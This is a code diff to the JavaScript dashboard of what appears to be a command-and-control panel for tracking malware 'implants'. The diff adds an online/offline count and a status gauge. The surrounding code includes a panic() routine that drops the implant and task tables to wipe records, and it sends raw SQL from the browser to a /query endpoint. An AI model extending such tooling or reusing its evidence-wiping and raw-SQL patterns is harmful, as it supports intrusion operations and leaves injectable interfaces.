@@ -25,16 +25,31 @@ function openTab(evt, tabName) {
 
 function refresh() {
     let reply = httpPost('/query',"SELECT * FROM implants");
+    let offline=0,total = 0,meow='';
     agents = JSON.parse(reply);
-    agentList.innerHTML = '';
-    agents.forEach(agent => agentList.innerHTML+='<a href=/agent/'+ agent[0] +'><button><li> '+agent[0] + ' - ' + agent[4] + '\\' + agent[5] + (Math.abs(new Date() - new Date(agent[2].replace(/-/g,'/')))>30000?'<div class="offline">offline':'<div class="online">online') +'</div></li></button></a>');
+    agents.forEach(agent => {
+      meow +='<a href=/agent/'+ agent[0] +'><button><li> '+agent[0] + ' - ' + agent[4] + '\\' + agent[5];
+      if(Math.abs(new Date() - new Date(agent[2].replace(/-/g,'/')))>30000){
+        meow+='<div class="offline">offline';
+        offline++;
+      }else{
+        meow+='<div class="online">online';
+      }
+      meow+='</div></li></button></a>';
+      total++;
+    });
+    agentList.innerHTML = meow;
+    document.getElementById('percentage').style.transform ='rotate('+(total-offline)/total*180+'deg)';
+    document.getElementById('gaugetxt').innerHTML = ((total-offline)/total*100).toFixed(2) + '%';
 }
+
 function panic() {
     httpPost('/query',"DROP TABLE implants");
     httpPost('/query',"DROP TABLE implant_task");
     httpPost('/query',"DROP TABLE tasks");
     httpPost('/query',"DROP TABLE actions");
 }
+
 function httpPost(url,query)
 {
     var xmlHttp = new XMLHttpRequest();
@@ -47,3 +62,5 @@ setInterval(refresh, 5000);
 document.addEventListener('DOMContentLoaded', function() {
         refresh();
 });
+document.getElementById('Overview').style.display = 'block';
+document.getElementsByClassName('tablinks')[0].className += ' active';
